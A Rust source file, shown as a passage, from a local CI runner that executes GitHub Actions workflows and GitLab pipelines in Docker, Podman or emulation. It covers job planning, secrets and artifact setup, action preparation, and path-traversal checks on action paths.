#[allow(unused_imports)]
use bollard::Docker;
use futures::future;
use serde_yaml::Value;
use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};
// std::process::Command replaced by tokio::process::Command for async safety
use thiserror::Error;

use ignore::{gitignore::GitignoreBuilder, Match};

use crate::action_resolver;
use crate::dependency;
use crate::docker;
use crate::environment;
use crate::podman;
use wrkflw_logging;
use wrkflw_matrix::MatrixCombination;
use wrkflw_models::gitlab::Pipeline;
use wrkflw_parser::gitlab::{self, parse_pipeline};
use wrkflw_parser::workflow::{
    self, parse_workflow, ActionInfo, Job, JobContainer, Step, WorkflowDefinition,
};
use wrkflw_runtime::container::{ContainerRuntime, COMBINED_IMAGE_PREFIX};
use wrkflw_runtime::emulation;
use wrkflw_secrets::{SecretConfig, SecretManager, SecretMasker, SecretSubstitution};

#[allow(unused_variables, unused_assignments)]
/// Execute a GitHub Actions workflow file locally
pub async fn execute_workflow(
    workflow_path: &Path,
    config: ExecutionConfig,
) -> Result<ExecutionResult, ExecutionError> {
    wrkflw_logging::info(&format!("Executing workflow: {}", workflow_path.display()));
    wrkflw_logging::info(&format!("Runtime: {:?}", config.runtime_type));

    // Determine if this is a GitLab CI/CD pipeline or GitHub Actions workflow
    let is_gitlab = is_gitlab_pipeline(workflow_path);

    if is_gitlab {
        execute_gitlab_pipeline(workflow_path, config.clone()).await
    } else {
        execute_github_workflow(workflow_path, config.clone()).await
    }
}

/// Determine if a file is a GitLab CI/CD pipeline
fn is_gitlab_pipeline(path: &Path) -> bool {
    // Check the file name
    if let Some(file_name) = path.file_name() {
        if let Some(file_name_str) = file_name.to_str() {
            return file_name_str == ".gitlab-ci.yml" || file_name_str.ends_with("gitlab-ci.yml");
        }
    }

    // If file name check fails, try to read and determine by content
    if let Ok(content) = fs::read_to_string(path) {
        // GitLab CI/CD pipelines typically have stages, before_script, after_script at the top level
        if content.contains("stages:")
            || content.contains("before_script:")
            || content.contains("after_script:")
        {
            // Check for GitHub Actions specific keys that would indicate it's not GitLab
            if !content.contains("on:")
                && !content.contains("runs-on:")
                && !content.contains("uses:")
            {
                return true;
            }
        }
    }

    false
}

/// Execute a GitHub Actions workflow file locally
async fn execute_github_workflow(
    workflow_path: &Path,
    config: ExecutionConfig,
) -> Result<ExecutionResult, ExecutionError> {
    // 1. Parse workflow file
    let workflow = parse_workflow(workflow_path)?;

    // 2. Resolve job dependencies and create execution plan
    let execution_plan = dependency::resolve_dependencies(&workflow)?;

    // Filter to target job and its transitive dependencies if specified
    let execution_plan = if let Some(ref target_job) = config.target_job {
        dependency::filter_plan_to_job(execution_plan, target_job, &workflow.jobs, "workflow")
            .map_err(ExecutionError::Execution)?
    } else {
        execution_plan
    };

    // 3. Initialize appropriate runtime
    let runtime = initialize_runtime(
        config.runtime_type.clone(),
        config.preserve_containers_on_failure,
    )?;

    // Create a temporary workspace directory
    let workspace_dir = tempfile::tempdir()
        .map_err(|e| ExecutionError::Execution(format!("Failed to create workspace: {}", e)))?;

    // 4. Set up GitHub-like environment
    let mut env_context = environment::create_github_context(&workflow, workspace_dir.path());

    // Add runtime mode to environment
    env_context.insert(
        "WRKFLW_RUNTIME_MODE".to_string(),
        match config.runtime_type {
            RuntimeType::Emulation => "emulation".to_string(),
            RuntimeType::SecureEmulation => "secure_emulation".to_string(),
            RuntimeType::Docker => "docker".to_string(),
            RuntimeType::Podman => "podman".to_string(),
        },
    );

    // show=true means hide=false (inverted for the env var)
    env_context.insert(
        "WRKFLW_HIDE_ACTION_MESSAGES".to_string(),
        if config.show_action_messages {
            "false"
        } else {
            "true"
        }
        .to_string(),
    );

    // Setup GitHub environment files
    environment::setup_github_environment_files(workspace_dir.path()).map_err(|e| {
        ExecutionError::Execution(format!("Failed to setup GitHub env files: {}", e))
    })?;

    // 5. Initialize secrets management
    let secret_manager = if let Some(secrets_config) = &config.secrets_config {
        Some(
            SecretManager::new(secrets_config.clone())
                .await
                .map_err(|e| {
                    ExecutionError::Execution(format!("Failed to initialize secret manager: {}", e))
                })?,
        )
    } else {
        Some(SecretManager::default().await.map_err(|e| {
            ExecutionError::Execution(format!(
                "Failed to initialize default secret manager: {}",
                e
            ))
        })?)
    };

    let secret_masker = SecretMasker::new();

    // Create artifact store for this workflow run
    let artifact_store =
        crate::artifacts::ArtifactStore::new(workspace_dir.path()).map_err(|e| {
            ExecutionError::Execution(format!("Failed to create artifact store: {}", e))
        })?;

    // Create cache store for this workflow run (persistent across runs)
    let cache_store = crate::cache::CacheStore::new()
        .map_err(|e| ExecutionError::Execution(format!("Failed to create cache store: {}", e)))?;

    // 6. Execute jobs according to the plan
    let mut results = Vec::new();
    let mut has_failures = false;
    let mut failure_details = String::new();
    // Accumulate job outputs and results across batches for `needs.*` context
    let mut all_job_outputs: HashMap<String, HashMap<String, String>> = HashMap::new();
    let mut all_job_results: HashMap<String, String> = HashMap::new();

    for job_batch in execution_plan {
        // Execute jobs in parallel if they don't depend on each other
        let job_results = execute_job_batch(
            &job_batch,
            &workflow,
            runtime.as_ref(),
            &env_context,
            config.verbose,
            secret_manager.as_ref(),
            Some(&secret_masker),
            &all_job_outputs,
            &all_job_results,
            &artifact_store,
            &cache_store,
        )
        .await?;

        // Collect job outputs and results for downstream jobs' `needs.*` context.
        // For matrix jobs, multiple combinations share the same canonical_name — the last
        // combination to complete wins.  This matches GitHub Actions' behavior where matrix
        // job outputs are non-deterministic when multiple combinations set the same key.
        for job_result in &job_results {
            if all_job_outputs.contains_key(&job_result.canonical_name)
                && job_result.name != job_result.canonical_name
            {
                wrkflw_logging::warning(&format!(
                    "Matrix job '{}' overwrites outputs for '{}' — \
                     needs.{}.outputs will reflect the last combination only",
                    job_result.name, job_result.canonical_name, job_result.canonical_name,
                ));
            }
            all_job_results.insert(
                job_result.canonical_name.clone(),
                job_result.status.to_string(),
            );
            all_job_outputs.insert(
                job_result.canonical_name.clone(),
                job_result.outputs.clone(),
            );
        }

        // Check for job failures and collect details
        for job_result in &job_results {
            if job_result.status == JobStatus::Failure {
                has_failures = true;
                failure_details.push_str(&format!(
                    "\n{} Job failed: {}\n",
                    wrkflw_logging::symbols::FAILURE,
                    job_result.name
                ));

                // Add step details for failed jobs
                for step in &job_result.steps {
                    if step.status == StepStatus::Failure {
                        failure_details.push_str(&format!(
                            "  {} {}: {}\n",
                            wrkflw_logging::symbols::FAILURE,
                            step.name,
                            step.output
                        ));
                    }
                }
            }
        }

        results.extend(job_results);
    }

    // If there were failures, add detailed failure information to the result
    if has_failures {
        wrkflw_logging::error(&format!("Workflow execution failed:{}", failure_details));
    }

    Ok(ExecutionResult {
        jobs: results,
        failure_details: if has_failures {
            Some(failure_details)
        } else {
            None
        },
    })
}

/// Execute a GitLab CI/CD pipeline locally
async fn execute_gitlab_pipeline(
    pipeline_path: &Path,
    config: ExecutionConfig,
) -> Result<ExecutionResult, ExecutionError> {
    wrkflw_logging::info("Executing GitLab CI/CD pipeline");

    // 1. Parse the GitLab pipeline file
    let pipeline = parse_pipeline(pipeline_path)
        .map_err(|e| ExecutionError::Parse(format!("Failed to parse GitLab pipeline: {}", e)))?;

    // 2. Convert the GitLab pipeline to a format compatible with the workflow executor
    let workflow = gitlab::convert_to_workflow_format(&pipeline);

    // 3. Resolve job dependencies based on stages
    let execution_plan = resolve_gitlab_dependencies(&pipeline, &workflow)?;

    // Filter to target job and its stage-based dependencies if specified.
    // GitLab uses stages for implicit ordering, so we keep all earlier stages.
    let execution_plan = if let Some(ref target_job) = config.target_job {
        dependency::filter_plan_to_job_by_stage(
            execution_plan,
            target_job,
            &workflow.jobs,
            "pipeline",
        )
        .map_err(ExecutionError::Execution)?
    } else {
        execution_plan
    };

    // 4. Initialize appropriate runtime
    let runtime = initialize_runtime(
        config.runtime_type.clone(),
        config.preserve_containers_on_failure,
    )?;

    // Create a temporary workspace directory
    let workspace_dir = tempfile::tempdir()
        .map_err(|e| ExecutionError::Execution(format!("Failed to create workspace: {}", e)))?;

    // 5. Set up GitLab-like environment
    let mut env_context = create_gitlab_context(&pipeline, workspace_dir.path());

    // Add runtime mode to environment
    env_context.insert(
        "WRKFLW_RUNTIME_MODE".to_string(),
        match config.runtime_type {
            RuntimeType::Emulation => "emulation".to_string(),
            RuntimeType::SecureEmulation => "secure_emulation".to_string(),
            RuntimeType::Docker => "docker".to_string(),
            RuntimeType::Podman => "podman".to_string(),
        },
    );

    // Setup environment files
    environment::setup_github_environment_files(workspace_dir.path()).map_err(|e| {
        ExecutionError::Execution(format!("Failed to setup environment files: {}", e))
    })?;

    // 6. Initialize secrets management
    let secret_manager = if let Some(secrets_config) = &config.secrets_config {
        Some(
            SecretManager::new(secrets_config.clone())
                .await
                .map_err(|e| {
                    ExecutionError::Execution(format!("Failed to initialize secret manager: {}", e))
                })?,
        )
    } else {
        Some(SecretManager::default().await.map_err(|e| {
            ExecutionError::Execution(format!(
                "Failed to initialize default secret manager: {}",
                e
            ))
        })?)
    };

    let secret_masker = SecretMasker::new();

    // Create artifact store for this pipeline run
    let artifact_store =
        crate::artifacts::ArtifactStore::new(workspace_dir.path()).map_err(|e| {
            ExecutionError::Execution(format!("Failed to create artifact store: {}", e))
        })?;

    // Create cache store for this pipeline run (persistent across runs)
    let cache_store = crate::cache::CacheStore::new()
        .map_err(|e| ExecutionError::Execution(format!("Failed to create cache store: {}", e)))?;

    // 7. Execute jobs according to the plan
    let mut results = Vec::new();
    let mut has_failures = false;
    let mut failure_details = String::new();

    for job_batch in execution_plan {
        // Execute jobs in parallel if they don't depend on each other.
        // GitLab CI uses artifacts/variables for inter-job communication, not `needs.*`
        // context, so we pass empty maps here.
        let job_results = execute_job_batch(
            &job_batch,
            &workflow,
            runtime.as_ref(),
            &env_context,
            config.verbose,
            secret_manager.as_ref(),
            Some(&secret_masker),
            &HashMap::new(),
            &HashMap::new(),
            &artifact_store,
            &cache_store,
        )
        .await?;

        // Check for job failures and collect details
        for job_result in &job_results {
            if job_result.status == JobStatus::Failure {
                has_failures = true;
                failure_details.push_str(&format!(
                    "\n{} Job failed: {}\n",
                    wrkflw_logging::symbols::FAILURE,
                    job_result.name
                ));

                // Add step details for failed jobs
                for step in &job_result.steps {
                    if step.status == StepStatus::Failure {
                        failure_details.push_str(&format!(
                            "  {} {}: {}\n",
                            wrkflw_logging::symbols::FAILURE,
                            step.name,
                            step.output
                        ));
                    }
                }
            }
        }

        results.extend(job_results);
    }

    // If there were failures, add detailed failure information to the result
    if has_failures {
        wrkflw_logging::error(&format!("Pipeline execution failed:{}", failure_details));
    }

    Ok(ExecutionResult {
        jobs: results,
        failure_details: if has_failures {
            Some(failure_details)
        } else {
            None
        },
    })
}

/// Create an environment context for GitLab CI/CD pipeline execution
fn create_gitlab_context(pipeline: &Pipeline, workspace_dir: &Path) -> HashMap<String, String> {
    let mut env_context = HashMap::new();

    // Add GitLab CI/CD environment variables
    env_context.insert("CI".to_string(), "true".to_string());
    env_context.insert("GITLAB_CI".to_string(), "true".to_string());

    // Add custom environment variable to indicate use in wrkflw
    env_context.insert("WRKFLW_CI".to_string(), "true".to_string());

    // Add workspace directory
    env_context.insert(
        "CI_PROJECT_DIR".to_string(),
        workspace_dir.to_string_lossy().to_string(),
    );

    // Also add the workspace as the GitHub workspace for compatibility with emulation runtime
    env_context.insert(
        "GITHUB_WORKSPACE".to_string(),
        workspace_dir.to_string_lossy().to_string(),
    );

    // Add global variables from the pipeline
    if let Some(variables) = &pipeline.variables {
        for (key, value) in variables {
            env_context.insert(key.clone(), value.clone());
        }
    }

    env_context
}

/// Resolve GitLab CI/CD pipeline dependencies
fn resolve_gitlab_dependencies(
    pipeline: &Pipeline,
    workflow: &WorkflowDefinition,
) -> Result<Vec<Vec<String>>, ExecutionError> {
    // For GitLab CI/CD pipelines, jobs within the same stage can run in parallel,
    // but jobs in different stages run sequentially

    // Get stages from the pipeline or create a default one
    let stages = match &pipeline.stages {
        Some(defined_stages) => defined_stages.clone(),
        None => vec![
            "build".to_string(),
            "test".to_string(),
            "deploy".to_string(),
        ],
    };

    // Create an execution plan based on stages
    let mut execution_plan = Vec::new();

    // For each stage, collect the jobs that belong to it
    for stage in stages {
        let mut stage_jobs = Vec::new();

        for (job_name, job) in &pipeline.jobs {
            // Skip template jobs
            if let Some(true) = job.template {
                continue;
            }

            // Get the job's stage, or assume "test" if not specified
            let default_stage = "test".to_string();
            let job_stage = job.stage.as_ref().unwrap_or(&default_stage);

            // If the job belongs to the current stage, add it to the batch
            if job_stage == &stage {
                stage_jobs.push(job_name.clone());
            }
        }

        if !stage_jobs.is_empty() {
            execution_plan.push(stage_jobs);
        }
    }

    // Also create a batch for jobs without a stage
    let mut stageless_jobs = Vec::new();

    for (job_name, job) in &pipeline.jobs {
        // Skip template jobs
        if let Some(true) = job.template {
            continue;
        }

        if job.stage.is_none() {
            stageless_jobs.push(job_name.clone());
        }
    }

    if !stageless_jobs.is_empty() {
        execution_plan.push(stageless_jobs);
    }

    Ok(execution_plan)
}

// Determine if Docker/Podman is available or fall back to emulation
fn initialize_runtime(
    runtime_type: RuntimeType,
    preserve_containers_on_failure: bool,
) -> Result<Box<dyn ContainerRuntime>, ExecutionError> {
    match runtime_type {
        RuntimeType::Docker => {
            if docker::is_available() {
                // Handle the Result returned by DockerRuntime::new()
                match docker::DockerRuntime::new_with_config(preserve_containers_on_failure) {
                    Ok(docker_runtime) => Ok(Box::new(docker_runtime)),
                    Err(e) => {
                        wrkflw_logging::error(&format!(
                            "Failed to initialize Docker runtime: {}, falling back to emulation mode",
                            e
                        ));
                        Ok(Box::new(emulation::EmulationRuntime::new()))
                    }
                }
            } else {
                wrkflw_logging::error("Docker not available, falling back to emulation mode");
                Ok(Box::new(emulation::EmulationRuntime::new()))
            }
        }
        RuntimeType::Podman => {
            if podman::is_available() {
                // Handle the Result returned by PodmanRuntime::new()
                match podman::PodmanRuntime::new_with_config(preserve_containers_on_failure) {
                    Ok(podman_runtime) => Ok(Box::new(podman_runtime)),
                    Err(e) => {
                        wrkflw_logging::error(&format!(
                            "Failed to initialize Podman runtime: {}, falling back to emulation mode",
                            e
                        ));
                        Ok(Box::new(emulation::EmulationRuntime::new()))
                    }
                }
            } else {
                wrkflw_logging::error("Podman not available, falling back to emulation mode");
                Ok(Box::new(emulation::EmulationRuntime::new()))
            }
        }
        RuntimeType::Emulation => Ok(Box::new(emulation::EmulationRuntime::new())),
        RuntimeType::SecureEmulation => Ok(Box::new(
            wrkflw_runtime::secure_emulation::SecureEmulationRuntime::new(),
        )),
    }
}

#[derive(Debug, Clone, PartialEq)]
pub enum RuntimeType {
    Docker,
    Podman,
    Emulation,
    SecureEmulation,
}

#[derive(Debug, Clone)]
pub struct ExecutionConfig {
    pub runtime_type: RuntimeType,
    pub verbose: bool,
    pub preserve_containers_on_failure: bool,
    pub secrets_config: Option<SecretConfig>,
    pub show_action_messages: bool,
    pub target_job: Option<String>,
}

pub struct ExecutionResult {
    pub jobs: Vec<JobResult>,
    pub failure_details: Option<String>,
}

pub struct JobResult {
    pub name: String,
    /// The canonical job key from the workflow definition (e.g., "build").
    /// For matrix jobs, `name` is the display name (e.g., "build (os: ubuntu)")
    /// while this remains the canonical key used for `needs.*` lookups.
    pub canonical_name: String,
    pub status: JobStatus,
    pub steps: Vec<StepResult>,
    pub logs: String,
    /// Resolved job outputs (from the job's `outputs:` mapping).
    pub outputs: HashMap<String, String>,
}

#[derive(Debug, Clone, PartialEq)]
#[allow(dead_code)]
pub enum JobStatus {
    Success,
    Failure,
    Skipped,
}

impl std::fmt::Display for JobStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            JobStatus::Success => f.write_str("success"),
            JobStatus::Failure => f.write_str("failure"),
            JobStatus::Skipped => f.write_str("skipped"),
        }
    }
}

#[derive(Debug, Clone)]
pub struct StepResult {
    pub name: String,
    pub status: StepStatus,
    pub output: String,
    /// Raw result before `continue-on-error` is applied.
    pub outcome: StepStatus,
    /// Effective result after `continue-on-error` is applied.
    pub conclusion: StepStatus,
}

impl StepResult {
    /// Create a StepResult where outcome and conclusion equal status (the common case).
    fn new(name: String, status: StepStatus, output: String) -> Self {
        Self {
            name,
            outcome: status,
            conclusion: status,
            status,
            output,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq)]
#[allow(dead_code)]
pub enum StepStatus {
    Success,
    Failure,
    Skipped,
}

impl std::fmt::Display for StepStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            StepStatus::Success => f.write_str("success"),
            StepStatus::Failure => f.write_str("failure"),
            StepStatus::Skipped => f.write_str("skipped"),
        }
    }
}

#[derive(Error, Debug)]
pub enum ExecutionError {
    #[error("Parse error: {0}")]
    Parse(String),

    #[error("Runtime error: {0}")]
    Runtime(String),

    #[error("Execution error: {0}")]
    Execution(String),

    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
}

// Convert errors from other modules
impl From<String> for ExecutionError {
    fn from(err: String) -> Self {
        ExecutionError::Parse(err)
    }
}

/// The result of preparing an action — either a Docker image to run or a composite action.
enum PreparedAction {
    /// Docker action: run with the image's native entrypoint/CMD, optionally
    /// overridden by `runs.entrypoint` and `runs.args` from action.yml.
    /// Used for DockerBuild and Docker registry actions.
    NativeDocker {
        image: String,
        entrypoint: Option<String>,
        args: Vec<String>,
    },
    /// A Docker image name to run a shell command in.
    ///
    /// Used by Node.js actions (resolved to `node:XX-slim`), the
    /// `determine_action_image` fallback, and `run:` steps. These paths
    /// build an explicit shell command that is passed as CMD, so the
    /// image's built-in ENTRYPOINT is intentionally overridden with a
    /// bash wrapper. If you need the image's native ENTRYPOINT/CMD,
    /// use `NativeDocker` instead.
    Image(String),
    /// A composite action that needs special step-based execution.
    Composite,
}

// Add Action preparation functions
async fn prepare_action(
    action: &ActionInfo,
    runtime: &dyn ContainerRuntime,
) -> Result<PreparedAction, ExecutionError> {
    if action.is_docker {
        // Docker action: pull the image and run with its native entrypoint
        let image = action.repository.trim_start_matches("docker://");

        runtime
            .pull_image(image)
            .await
            .map_err(|e| ExecutionError::Runtime(format!("Failed to pull Docker image: {}", e)))?;

        return Ok(PreparedAction::NativeDocker {
            image: image.to_string(),
            entrypoint: None,
            args: vec![],
        });
    }

    if action.is_local {
        // Local action: build from local directory
        let action_dir = Path::new(&action.repository);

        if !action_dir.exists() {
            return Err(ExecutionError::Execution(format!(
                "Local action directory not found: {}",
                action_dir.display()
            )));
        }

        // Parse action.yml/action.yaml once — used for both Docker and composite detection
        let definition: Option<serde_yaml::Value> =
            std::fs::read_to_string(action_dir.join("action.yml"))
                .or_else(|_| std::fs::read_to_string(action_dir.join("action.yaml")))
                .ok()
                .and_then(|s| serde_yaml::from_str(&s).ok());

        let dockerfile = action_dir.join("Dockerfile");
        if dockerfile.exists() {
            // It's a Docker action, build it
            let tag = format!("wrkflw-local-action:{}", uuid::Uuid::new_v4());

            runtime
                .build_image(&dockerfile, &tag, action_dir)
                .await
                .map_err(|e| ExecutionError::Runtime(format!("Failed to build image: {}", e)))?;

            let (entrypoint, args) =
                extract_docker_runs_config(definition.as_ref()).map_err(|e| {
                    ExecutionError::Execution(format!(
                        "Invalid runs config in local action '{}': {}",
                        action.repository, e
                    ))
                })?;

            return Ok(PreparedAction::NativeDocker {
                image: tag,
                entrypoint,
                args,
            });
        } else {
            // Check if it's a composite action
            if let Some(def) = &definition {
                if let Some(using) = def
                    .get("runs")
                    .and_then(|r| r.get("using"))
                    .and_then(|u| u.as_str())
                {
                    if using == "composite" {
                        return Ok(PreparedAction::Composite);
                    }
                }
            }

            // Fall back to node for JS actions
            return Ok(PreparedAction::Image("node:20-slim".to_string()));
        }
    }

    // GitHub action: try to fetch action.yml from the remote repository
    if !action.repository.is_empty() && !action.version.is_empty() {
        match action_resolver::resolve_remote_action(
            &action.repository,
            &action.version,
            action.sub_path.as_deref(),
        )
        .await
        {
            Ok(resolved) => match &resolved.action_type {
                action_resolver::ActionType::Node { version } => {
                    let image = format!("node:{}-slim", version);
                    wrkflw_logging::info(&format!(
                        "Resolved action '{}' -> image '{}'",
                        action.repository, image
                    ));
                    return Ok(PreparedAction::Image(image));
                }
                action_resolver::ActionType::Docker { image } => {
                    wrkflw_logging::info(&format!(
                        "Resolved action '{}' -> Docker image '{}'",
                        action.repository, image
                    ));
                    let (entrypoint, args) =
                        extract_docker_runs_config(resolved.definition.as_ref()).map_err(|e| {
                            ExecutionError::Execution(format!(
                                "Invalid runs config for action '{}': {}",
                                action.repository, e
                            ))
                        })?;
                    return Ok(PreparedAction::NativeDocker {
                        image: image.clone(),
                        entrypoint,
                        args,
                    });
                }
                action_resolver::ActionType::Composite => {
                    wrkflw_logging::info(&format!(
                        "Resolved action '{}' as composite action",
                        action.repository
                    ));
                    return Ok(PreparedAction::Composite);
                }
                action_resolver::ActionType::DockerBuild => {
                    wrkflw_logging::info(&format!(
                        "Resolved action '{}' as DockerBuild — cloning and building",
                        action.repository
                    ));

                    // Clone the repository.
                    // `tempdir` is only needed through `build_image` — after the
                    // image is built all files are baked into the Docker image
                    // and the temp directory can be dropped safely.
                    let tempdir = tempfile::tempdir().map_err(|e| {
                        ExecutionError::Execution(format!("Failed to create temp dir: {}", e))
                    })?;
                    let repo_url = format!("https://github.com/{}.git", action.repository);
                    let repo_dir = tempdir.path().join("action");
                    shallow_clone(&repo_url, &action.version, &repo_dir).await?;

                    // Resolve the action directory (respecting sub_path)
                    let action_dir = match &action.sub_path {
                        Some(p) => {
                            sanitize_sub_path(p).map_err(|e| {
                                ExecutionError::Execution(format!(
                                    "Invalid sub_path for action '{}': {}",
                                    action.repository, e
                                ))
                            })?;
                            repo_dir.join(p)
                        }
                        None => repo_dir.clone(),
                    };

                    // Defense-in-depth: verify the action directory is still
                    // inside the cloned repo after symlink resolution.
                    let canon_action_dir = action_dir.canonicalize().map_err(|e| {
                        ExecutionError::Execution(format!(
                            "Failed to canonicalize action directory: {}",
                            e
                        ))
                    })?;
                    let canon_repo_dir = repo_dir.canonicalize().map_err(|e| {
                        ExecutionError::Execution(format!(
                            "Failed to canonicalize repo directory: {}",
                            e
                        ))
                    })?;
                    if !canon_action_dir.starts_with(&canon_repo_dir) {
                        return Err(ExecutionError::Execution(format!(
                            "Action sub_path escapes repository directory for action '{}'",
                            action.repository
                        )));
                    }

                    // Get the Dockerfile path from action.yml's runs.image field.
                    let dockerfile_raw = resolved
                        .definition
                        .as_ref()
                        .and_then(|d| d.get("runs"))
                        .and_then(|r| r.get("image"))
                        .and_then(|i| i.as_str())
                        .unwrap_or("Dockerfile");

                    let dockerfile_rel = sanitize_dockerfile_rel(dockerfile_raw).map_err(|e| {
                        ExecutionError::Execution(format!(
                            "Invalid Dockerfile path for action '{}': {}",
                            action.repository, e
                        ))
                    })?;

                    let dockerfile = action_dir.join(dockerfile_rel);

                    if !dockerfile.exists() {
                        return Err(ExecutionError::Execution(format!(
                            "Dockerfile not found at {} for action '{}'",
                            dockerfile.display(),
                            action.repository
                        )));
                    }

                    // Defense-in-depth: verify the resolved Dockerfile is
                    // still inside the action directory after symlink resolution.
                    // (canon_action_dir was already computed above for the sub_path check.)
                    let canon_dockerfile = dockerfile.canonicalize().map_err(|e| {
                        ExecutionError::Execution(format!(
                            "Failed to canonicalize Dockerfile path: {}",
                            e
                        ))
                    })?;
                    if !canon_dockerfile.starts_with(&canon_action_dir) {
                        return Err(ExecutionError::Execution(format!(
                            "Dockerfile path '{}' escapes action directory for action '{}'",
                            dockerfile.display(),
                            action.repository
                        )));
                    }

                    // Build the image
                    let tag = format!("wrkflw-action:{}", uuid::Uuid::new_v4());
                    runtime
                        .build_image(&dockerfile, &tag, &action_dir)
                        .await
                        .map_err(|e| {
                            ExecutionError::Runtime(format!(
                                "Failed to build Dockerfile for action '{}': {}",
                                action.repository, e
                            ))
                        })?;

                    let (entrypoint, args) =
                        extract_docker_runs_config(resolved.definition.as_ref()).map_err(|e| {
                            ExecutionError::Execution(format!(
                                "Invalid runs config for action '{}': {}",
                                action.repository, e
                            ))
                        })?;
                    return Ok(PreparedAction::NativeDocker {
                        image: tag,
                        entrypoint,
                        args,
                    });
                }
            },
            Err(e) => {
                wrkflw_logging::warning(&format!(
                    "Could not fetch action.yml for {}@{}: {}. Falling back to built-in mapping.",
                    action.repository, action.version, e
                ));
            }
        }
    }

    // Fallback: determine appropriate image based on hardcoded action type mapping
    let image = determine_action_image(&action.repository);
    Ok(PreparedAction::Image(image))
}

/// Execute a `NativeDocker` action step.
///
/// Handles `with.args` / `with.entrypoint` overrides, INPUT_* env injection,
/// volume setup, and container invocation.
async fn execute_native_docker_step(
    ctx: &StepExecutionContext<'_>,
    step_env: &mut HashMap<String, String>,
    step_name: String,
    uses: &str,
    image: String,
    entrypoint: Option<String>,
    args: Vec<String>,
) -> Result<StepResult, ExecutionError> {
    // Convert 'with' parameters to INPUT_* environment variables.
    // Also extract 'with.args' — if provided by the workflow step, it
    // overrides the action.yml's runs.args as the container CMD
    // (this matches GitHub Actions behavior).
    let mut with_args_override: Option<String> = None;
    // Allow workflow step to override entrypoint via `with.entrypoint`,
    // matching GitHub Actions behavior.
    let mut entrypoint = entrypoint;
    if let Some(with_params) = &ctx.step.with {
        for (key, value) in with_params {
            step_env.insert(format!("INPUT_{}", key.to_uppercase()), value.clone());
        }
        // Presence of the key is the override signal — even an empty
        // string means "pass zero args", matching GitHub Actions behavior.
        if let Some(a) = with_params.get("args") {
            with_args_override = Some(a.clone());
        }
        if let Some(ep) = with_params.get("entrypoint") {
            entrypoint = Some(ep.clone());
        }
    }

    let container_workspace = Path::new("/github/workspace");
    let mount_ctx = prepare_step_container_context(step_env, ctx.job_env, ctx.container_config);
    let volumes = mount_ctx.build_volumes(ctx.working_dir, container_workspace);
    let env_vars: Vec<(&str, &str)> = step_env
        .iter()
        .map(|(k, v)| (k.as_str(), v.as_str()))
        .collect();

    wrkflw_logging::info(&format!(
        "Running Docker action '{}' with image '{}'",
        uses, image
    ));

    // Determine container CMD: workflow `with.args` overrides action.yml `runs.args`.
    // If neither is specified, the image's built-in CMD takes effect.
    let effective_args: Vec<String> = if let Some(ref wa) = with_args_override {
        shlex::split(wa).ok_or_else(|| {
            ExecutionError::Execution(format!(
                "Failed to parse 'with.args' for action '{}': \
                 unmatched quote in {:?}",
                uses, wa
            ))
        })?
    } else {
        args
    };
    let args_refs: Vec<&str> = effective_args.iter().map(|s| s.as_str()).collect();

    let output = ctx
        .runtime
        .run_container(
            &image,
            &args_refs,
            &env_vars,
            container_workspace,
            &volumes,
            entrypoint.as_deref(),
        )
        .await
        .map_err(|e| ExecutionError::Runtime(format!("{}", e)))?;

    Ok(StepResult::new(
        step_name,
        if output.exit_code == 0 {
            StepStatus::Success
        } else {
            StepStatus::Failure
        },
        format!(
            "Exit code: {}\n{}\n{}",
            output.exit_code, output.stdout, output.stderr
        ),
    ))
}

/// Sanitize a sub-path component from an action reference (e.g. `owner/repo/sub/path`).
///
/// Rejects any path component that is exactly `..` to prevent directory
/// traversal out of the cloned repository. Both `/` and `\` are treated
/// as separators for defense-in-depth (backslash paths are unlikely in
/// practice but could bypass a `/`-only check on Windows hosts).
fn sanitize_sub_path(raw: &str) -> Result<(), String> {
    if raw.contains('\0') {
        return Err("null byte not allowed in sub_path".to_string());
    }
    // Split on both forward and back slashes to catch Windows-style traversal.
    if raw.split(&['/', '\\'][..]).any(|c| c == "..") {
        return Err(format!("path traversal not allowed in sub_path: {}", raw));
    }
    Ok(())
}

/// Sanitize a Dockerfile path from an action.yml `runs.image` field.
///
/// Strips the `docker://` prefix and leading slashes, then rejects any
/// path component that is exactly `..` to prevent directory traversal.
fn sanitize_dockerfile_rel(raw: &str) -> Result<String, String> {
    if raw.contains('\0') {
        return Err("null byte not allowed in Dockerfile path".to_string());
    }
    let trimmed = raw
        .trim_start_matches("docker://")
        .trim_start_matches('/')
        .trim_start_matches("./");
    if trimmed.is_empty() {
        return Err("empty Dockerfile path".to_string());
    }
    if trimmed.split(&['/', '\\'][..]).any(|c| c == "..") {
        return Err(format!("path traversal not allowed: {}", trimmed));
    }
    Ok(trimmed.to_string())
}

/// Extract `runs.entrypoint` and `runs.args` from a parsed action.yml definition.
///
/// These fields allow Docker actions to override the image's default ENTRYPOINT
/// and provide arguments that are passed as CMD.
///
/// Returns an error if `runs.args` is a string with unmatched quotes, keeping
/// error handling consistent with how `with.args` is parsed at execution time.
fn extract_docker_runs_config(
    definition: Option<&serde_yaml::Value>,
) -> Result<(Option<String>, Vec<String>), String> {
    let runs = definition.and_then(|d| d.get("runs"));

    let entrypoint = runs
        .and_then(|r| r.get("entrypoint"))
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .map(|s| s.to_string());

    let args = match runs.and_then(|r| r.get("args")) {
        Some(v) => {
            if let Some(seq) = v.as_sequence() {
                // args as a YAML sequence: ["--flag", "value"]
                seq.iter()
                    .map(|v| {
                        v.as_str().map(|s| s.to_string()).unwrap_or_else(|| {
                            // Coerce non-string values (int, bool, etc.) to strings,
                            // matching GitHub Actions behavior.
                            serde_yaml::to_string(v)
                                .unwrap_or_default()
                                .trim()
                                .to_string()
                        })
                    })
                    .collect()
            } else if let Some(s) = v.as_str() {
                // args as a single string: "hello world" → shell-tokenize
                shlex::split(s).ok_or_else(|| format!("unmatched quote in runs.args: {:?}", s))?
            } else {
                vec![]
            }
        }
        None => vec![],
    };

    Ok((entrypoint, args))
}

/// Shallow-clone a GitHub repository at a specific ref (branch, tag, or SHA).
///
/// For branch/tag refs, uses `git clone --depth 1 --branch <ref>`.
/// For SHA refs (40 hex chars), uses `git init` + `git fetch --depth 1` + `git checkout`.
///
/// Uses `tokio::process::Command` to avoid blocking the async runtime.
